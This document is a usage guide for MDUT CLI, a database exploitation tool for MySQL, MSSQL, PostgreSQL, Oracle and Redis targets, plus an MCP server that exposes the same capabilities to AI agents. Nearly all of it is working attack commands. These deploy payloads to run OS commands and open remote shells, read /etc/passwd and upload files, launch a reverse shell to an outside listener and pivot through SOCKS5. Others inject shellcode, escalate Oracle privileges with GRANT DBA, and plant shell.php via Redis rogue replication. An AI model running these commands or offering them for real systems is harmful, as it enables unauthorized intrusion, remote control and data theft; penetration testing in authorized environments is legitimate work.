# MDUT CLI Guide

MDUT CLI is the main binary's headless mode, with sqlmap-style commands. The GUI and CLI share the same database, SQL, and exploitation engines; no separate plugin or runtime download is required.

```bash
mdut cli [connection] [action] [modifiers]
```

> `mdut` in this guide means the application executable. On Windows, use the actual `.exe` filename.

## 1. Quick Start

```bash
# Chinese/English help
mdut cli --help
mdut cli --lang zh --help

# Test a MySQL connection and print its version
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --check

# Run SQL without deploying an exploit payload
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" -q "SELECT user(), version()"

# Deploy UDF if needed, execute, then clean up this invocation's deployment
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --exec "id"

# Interactive command shell
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell
```

## 2. Basic Rules

- Each invocation uses one connection, one session, and one primary action. Use shell scripts for multi-step workflows.
- `--deploy` may accompany another action. `--blind` and `--pg-method` are modifiers, not primary actions.
- SQL, metadata, and native Redis commands never deploy an exploit payload.
- Exploit actions probe first. A suitable existing payload is reused instead of redeployed.
- Automatic cleanup covers only payloads successfully created and owned by the current process, never a payload reused from another session.
- Exit codes:
  - `0`: success
  - `1`: validation, action, capability, execution, or cleanup failure
  - `2`: connection or ping failure

## 3. Connections

### 3.1 DSNs

| Database | DSN example |
|---|---|
| MySQL | `mysql://root:secret@127.0.0.1:3306/mysql?tls=true` |
| MSSQL | `mssql://sa:secret@127.0.0.1:1433/master` |
| PostgreSQL | `postgres://postgres:secret@127.0.0.1:5432/postgres?sslmode=disable` |
| Oracle | `oracle://test:secret@127.0.0.1:1521/XEPDB1` |
| Redis | `redis://:secret@127.0.0.1:6379/2`, or no password `redis://127.0.0.1:6379` |

Notes:

- Default ports: MySQL 3306, MSSQL 1433, PostgreSQL 5432, Oracle 1521, Redis 6379.
- `postgresql://` aliases `postgres://`.
- For Oracle, the path is a **service name**, not a SID. Override it with `--service-name` or `?service_name=`.
- For Redis, the path is the DB index and becomes `extra.db`. Negative, non-numeric, and out-of-range indexes fail.
- Redis ACL usernames are not supported by the current connector and fail explicitly.
- Unknown DSN query keys fail instead of being silently ignored.

### 3.2 Discrete Flags

Use discrete flags to avoid DSN encoding entirely:

```bash
mdut cli \
  --type mysql --host 127.0.0.1 --port 3306 \
  --user root --pass 'p@ss/w:rd' --db mysql --check
```

They can also override individual DSN fields:

```bash
mdut cli -d "mysql://root@127.0.0.1:3306/mysql" --pass 'p@ss/w:rd' --check
```

Password options:

1. URL-encode it in the DSN: `p@ss/w:rd` → `p%40ss%2Fw%3Ard`
2. Pass it raw with `--pass 'p@ss/w:rd'`
3. Use `MDUT_PASS='p@ss/w:rd'` to keep it out of the process list

### 3.3 Database-specific Extra Options

Repeat `--extra key=value` as needed. These are equivalent to DSN query parameters:

| Database | Supported values | Example |
|---|---|---|
| MySQL | `tls` | `--extra tls=true` |
| PostgreSQL | `sslmode` | `--extra sslmode=disable` |
| Oracle | `service_name`, `as_sysdba` | `--extra as_sysdba=true` |
| Redis | `db` | `--extra db=2` |

### 3.4 Outbound Proxy

```bash
mdut cli -d "mysql://root:secret@10.0.0.8:3306/mysql" \
  --proxy "socks5://user:pass@127.0.0.1:1080" --check
```

`--proxy` is the outbound proxy used to reach the database. It is unrelated to the forward SOCKS5 server started on a target by `--socks5`.

### 3.5 Saved GUI Connections

```bash
# List saved connections without connecting
mdut cli --list-conns
mdut cli --list-conns --json

# Reuse the complete configuration, including proxy and Redis rogue settings
mdut cli --conn-id SAVED_CONNECTION_ID --check
```

- `--conn-id` conflicts with `-d`, `--type`, `--host`, `--port`, `--user`, and `--db`.
- Explicit `--pass` overrides the saved password; `MDUT_PASS` does **not**.
- `--proxy`, `--service-name`, `--rogue`, `--relay`, and `--module-path` may override saved values.
- `--list-conns --json` excludes passwords and proxy configuration.

## 4. Output, Language, and Timeouts

| Flag | Purpose |
|---|---|
| `--json` | Structured output for automation |
| `--lang zh` / `--lang en` | Help and CLI-generated error language |
| `--charset <name>` | Target command/file charset, such as `GBK` |
| `--timeout <seconds>` | Per-engine-call timeout, default 30; does not change the 15-second connect timeout |

Language precedence: `--lang` > `LANG`/`LC_ALL` beginning with `zh` > English.

`--check --json` produces output such as:

```json
{"type":"mysql","version":"5.7.44"}
```

`--read-file` writes the remote content to stdout, so redirection is straightforward:

```bash
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --read-file /etc/passwd > passwd.txt
```

The persistent waits used by `--socks5` and Oracle `--revshell` are not bounded by `--timeout`. Each command inside the REPL gets its own timeout.

## 5. SQL and Metadata (No Deployment)

| Action | Purpose | Example |
|---|---|---|
| `--check` | Connect, ping, print version | `--check` |
| `-q, --query <sql>` | Query and print every result set | `-q "SELECT * FROM user"` |
| `-e, --execute <sql>` | Execute DDL/DML and print affected rows | `-e "CREATE TABLE t(id INT)"` |
| `--dbs` | List databases/schemas | `--dbs` |
| `--tables <db>` | List tables | `--tables mysql` |
| `--columns <db.table>` | List columns | `--columns mysql.user` |
| `--ddl <db.table>` | Print DDL, falling back to a column summary | `--ddl mysql.user` |
| `--redis-cmd <text>` | Native Redis commands, one per line | `--redis-cmd $'SET a 1\nGET a'` |

`--columns` and `--ddl` split the database and table at the first dot.

Redis example:

```bash
mdut cli -d "redis://127.0.0.1:6379/2" --redis-cmd $'SELECT 2\nSET foo "bar baz"\nGET foo'
```

Each nonempty line executes separately, in order, with quote-aware tokenization. Unclosed quotes fall back to whitespace splitting.

## 6. Probing, Deployment, and Cleanup

### 6.1 Environment Probe

```bash
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --env-check
```

This only probes. It prints version, target OS/architecture, privileges, plugin directory, and current capabilities without deploying.

### 6.2 Deployment and Automatic Cleanup

```bash
# Standalone deployment, retained (MySQL/PostgreSQL UDF/Redis only)
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --deploy

# Clean a recoverable deployment later
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --cleanup

# Deploy + execute + clean this invocation's deployment
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --deploy --exec "id"

# Keep this invocation's deployment
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --exec "id" --no-cleanup
```

Rules:

- Reusable payloads are not redeployed or treated as owned by the current process.
- Only payloads confirmed as created by this process are automatically cleaned.
- Oracle and MSSQL do not support standalone `--deploy`; use a concrete action instead.
- `--cleanup` never deploys first.
- After a failed or interrupted deployment, CLI does not run broad cleanup that could delete another session's payload. It probes and reports possible residue for manual inspection.

### 6.3 Cross-process Cleanup

| Database | Cross-process `--cleanup` behavior |
|---|---|
| MySQL | Probe and clean a recoverable UDF, including functions and the payload file when removable |
| PostgreSQL | Probe and clean a recoverable UDF; libc has separate `CleanupLibc` handling |
| Redis | Unload only when a Module is detected; otherwise report that no cleanup is needed |
| Oracle | Limited to recoverable Java strategies, including legacy fixed-name `MDUT_SHELL`; current random-name deployments are not guaranteed recoverable |
| MSSQL | Unsupported; CLI never deploys first to fake a successful cleanup |

## 7. Command Execution

### 7.1 Echo and Blind Modes

```bash
# Wait for and print output
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --exec "id && uname -a"

# Fire and forget: useful for persistent processes, services, and file writes
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --blind --exec "sleep 60"

# Chinese Windows output
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --charset GBK --exec "dir"
```

`--blind` modifies `--exec` and `--shell`. Strategies such as MSSQL Agent Job and Oracle Scheduler are inherently blind and produce a warning instead of pretending output exists.

Errors embedded in an execution result also cause exit code `1`. If an action fails after a successful deployment, cleanup still runs.

### 7.2 Interactive Shell

```bash
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell --blind
```

- Use `exit`, `quit`, or Ctrl+D to leave.
- SIGINT/SIGTERM is handled both while waiting for input and during engine calls, followed by normal cleanup.
- Piped input works:

```bash
printf 'id\nwhoami\nexit\n' | mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell
```

## 8. File Operations

Paths are passed as independent values, never joined with colons, so `C:\...` works unambiguously.

| Action | Usage |
|---|---|
| List directory | `--list-dir /tmp` |
| Read to stdout | `--read-file /etc/passwd` |
| Download | `--download --src /remote/file --dst /local/file` |
| Upload | `--upload --src /local/file --dst /remote/file` |
| Redis precise write | `--write-precise --src /local/file --dst /remote/file` |
| Delete | `--delete-file /tmp/a.txt` |
| Create directory | `--mkdir /tmp/a` |
| Rename | `--rename --src /tmp/a.txt --dst /tmp/b.txt` |
| Create empty file | `--touch /tmp/empty.txt` |
| File size | `--file-size /tmp/a.txt` |
| SHA256 | `--hash-file /tmp/a.txt` |

Uploads and downloads use 512 KiB raw-byte chunks:

- Upload uses `WriteFile` for the first chunk and `AppendFile` for the rest, validating each remote write count.
- Download gets the remote size first and advances by decoded byte count.
- Zero-byte files are supported.
- MSSQL chunked transfers require `ChunkedIO`; ordinary directory browsing does not necessarily require CLR.
- Oracle `--mkdir` uses the Java strategy to recursively create missing parent directories. It succeeds idempotently when the directory already exists and fails explicitly if a regular file occupies the path or creation fails. The Scheduler strategy reports it as unsupported; unsupported hash operations also fail explicitly.

Examples:

```bash
# Upload and compare hashes
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" \
  --upload --src ./payload.bin --dst /tmp/payload.bin
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --hash-file /tmp/payload.bin
shasum -a 256 ./payload.bin

# Windows remote path
mdut cli -d "mssql://sa:secret@192.168.1.10:1433/master" \
  --download --src 'C:\Windows\Temp\a.txt' --dst ./a.txt
```

## 9. Reverse Shell, SOCKS5, and Shellcode

### 9.1 Reverse Shell

Start a listener first:

```bash
nc -lv 443
```

Then run:

```bash
mdut cli -d "mysql://root:secret@192.168.1.10:3306/mysql" --revshell 192.168.1.20:443
```

- Use `host:port`; IPv6 requires brackets, such as `[::1]:443`.
- Oracle reverse shell requires the Java call and DB session to remain alive. CLI waits until SIGINT/SIGTERM; do not kill it while the shell is still needed.
- Other databases return immediately after submission.

### 9.2 Target-side SOCKS5

```bash
mdut cli -d "mysql://root:secret@192.168.1.10:3306/mysql" \
  --socks5 0.0.0.0:1080 --socks5-auth 'user:pass'
```

`0.0.0.0:1080` is the **target server's** listen address, not a local address. From another terminal:

```bash
curl -x socks5h://192.168.1.10:1080 http://example.com
```

- The process stays running. Ctrl+C stops SOCKS5, cleans the current deployment, and disconnects in that order.
- The authentication password may contain colons; only the first colon separates user and password.
- Standalone `--stop-socks5` requires a recoverable running state. A new Oracle process cannot report success from an empty state.

### 9.3 Shellcode

```bash
mdut cli -d "mssql://sa:secret@192.168.1.10:1433/master" --shellcode @calc.hex
```

- Input is hexadecimal text. `@file` reads hex text from a file, not raw binary bytes.
- Windows targets only, subject to current strategy capabilities. Oracle is unsupported.

## 10. Database-specific Behavior

### 10.1 Oracle

```bash
# Privilege report and available escalation paths
mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" --priv-report

# Default GRANT DBA
mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" --privesc

# Custom privileged SQL
mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" \
  --privesc --privesc-sql "GRANT CREATE EXTERNAL JOB TO test"
```

- `--priv-report` and `--privesc` do not deploy payloads.
- The reconnect hint appears only after a successful default GRANT DBA when the user was not already DBA.
- Java Source supports output and file management; Scheduler is primarily blind execution.
- Recovered legacy fixed-name Java cannot be assumed to support SOCKS5. Follow the cleanup-first instruction instead of redeploying implicitly.
- Oracle `--revshell` is persistent and is not interrupted by `--timeout`.

### 10.2 MSSQL (Windows Targets Only)

- Strategies degrade from xp_cmdshell to OLE to Agent Job. Agent Job is blind-only.
- On Windows, the CLR extension adds reverse shell, shellcode, and SOCKS5.
- File management and chunked I/O do not depend on CLR. Without CLR, built-in strategies can still upload, download, and browse directories according to the reported capabilities.
- Deployment records the original xp_cmdshell/OLE settings and restores them during cleanup instead of blindly disabling them.
- MSSQL on Linux is outside the CLI's supported scope.

### 10.3 PostgreSQL

```bash
# COPY TO PROGRAM (PG 9.3+, no UDF required)
mdut cli -d "postgres://postgres:secret@127.0.0.1:5432/postgres" \
  --pg-method copy_program --exec "id"

# libc system() (PG < 8.2 only)
mdut cli -d "postgres://postgres:secret@127.0.0.1:5432/postgres" \
  --pg-method libc --exec "id"
```

- The default is `--pg-method udf`. Specify other methods again in each new process.
- `copy_program` and `libc` command execution do not deploy UDF.
- File operations, reverse shell, SOCKS5, and shellcode still follow UDF requirements.
- Libc cleanup removes only the random function created by this invocation, not a reused UDF.

### 10.4 Redis

#### Direct callback deployment

```bash
mdut cli -d "redis://127.0.0.1:6379" \
  --rogue host.docker.internal:21000 --exec "id"
```

`--rogue HOST:PORT` requires a fixed nonzero port. CLI binds the same port locally and advertises it to the target. `HOST` must be reachable from the target; `host.docker.internal` is common for Docker.

#### Relay mode

```bash
mdut cli -d "redis://10.0.0.8:6379" \
  --relay VPS_IP:21000 --rogue VPS_IP:21001 --exec "id"
```

`--relay` is the relay control address. `--rogue` is the target-visible replication callback on the VPS. Both are required. `--module-path` affects only the Module destination, not the precise-write destination.

#### Precise file write

```bash
mdut cli -d "redis://127.0.0.1:6379" \
  --rogue host.docker.internal:21000 \
  --write-precise --src ./shell.php --dst /var/www/html/shell.php
```

- When directory probing (`DirProbe`) is available, `--list-dir` works without deploying a Module. Likewise, `--revshell` uses an available Lua sandbox-escape channel without deploying a Module. Other file operations and SOCKS5 still require a Module.

- Uses replication directly, with no Module deployment or cleanup.
- **Clears the target's in-memory dataset and overwrites the destination file.**
- Inputs shorter than 9 bytes are padded with newlines to 9 bytes; only inputs at least that long remain byte-exact.
- Redis 8 may disable MODULE commands and protect `dir`/`dbfilename`, limiting both Module deployment and replication writes.
- Redis `--revshell` is supported only on non-Windows targets. Shellcode is Windows-only.

## 11. Scripting Example

```bash
#!/usr/bin/env bash
set -euo pipefail

export MDUT_PASS='p@ss/w:rd'
DSN="mysql://root@127.0.0.1:3306/mysql"

mdut cli -d "$DSN" --check --json
mdut cli -d "$DSN" -q "SELECT user(), version()" --json
mdut cli -d "$DSN" --exec "id"
mdut cli -d "$DSN" --upload --src ./report.txt --dst /tmp/report.txt
mdut cli -d "$DSN" --blind --exec "nohup /tmp/worker >/tmp/worker.log 2>&1 &"
```

## 12. Troubleshooting

| Problem | Resolution |
|---|---|
| Password contains `@`, `:`, `/`, `#`, or `%` | Use `--pass` or `MDUT_PASS`; URL-encode it inside a DSN |
| Oracle service error | The path/`--db` is a service name, not a SID |
| Redis writes to DB0 | Use `redis://host:6379/N` or `--extra db=N` |
| Rogue callback required | Provide target-reachable `--rogue HOST:PORT`; relay mode also needs `--relay` |
| No command output | The active strategy may be blind-only; inspect the capability summary |
| Residue after deployment | Failed/interrupted deployment is not guaranteed to roll back; inspect and clean manually |
| Cleanup after `--no-cleanup` | Use `--cleanup`, limited to engine-recoverable state |
| SOCKS5 or Oracle revshell does not exit | Expected persistent behavior; send SIGINT/SIGTERM, not `--timeout` |
| Unknown architecture | The target INFO lacks a recognizable machine ISA, so CLI refuses to guess a payload platform |

## 13. MCP Server

The MCP server exposes **35 tools**, including the complete file workflow and database-specific execution controls. Build its standalone STDIO entrypoint with:

```bash
go build -tags mcp -o mdut-mcp ./cmd/mcp
./mdut-mcp
```

After `connect` returns a `session_id`, file tools can create, rename, append, chunk-read, size, and hash remote files. `append_file` accepts standard Base64 without changing its encoding; `read_file_chunk` returns Base64 and requires a nonnegative integer `offset` and positive integer `length`:

```json
{"session_id":"SESSION_ID","path":"/tmp/a.bin","offset":0,"length":4096}
```

`list_dir` accepts optional `path_charset`; `read_file` and `write_file` accept optional `path_charset` and `content_charset`, all defaulting to UTF-8. PostgreSQL clients can select no-UDF command execution before `exec_command`:

```json
{"session_id":"SESSION_ID","method":"copy_program"}
```

Send that request to `set_pg_exec_method`. `start_socks5` additionally accepts optional `user` and `pass` credentials. On Redis sessions, generic `deploy_exploit` uses the same Module deployment path and `module_path`/rogue/relay arguments as `redis_deploy_module`.

See [the MCP guide](mcp-en.md) for the complete tool inventory and examples.

## Security Notes

CLI can execute SQL, write files, register functions, and load modules on a target. Precise writes clear the Redis in-memory dataset. Use only in authorized environments, allow default cleanup to finish when possible, and inspect the target after failed or interrupted deployments.
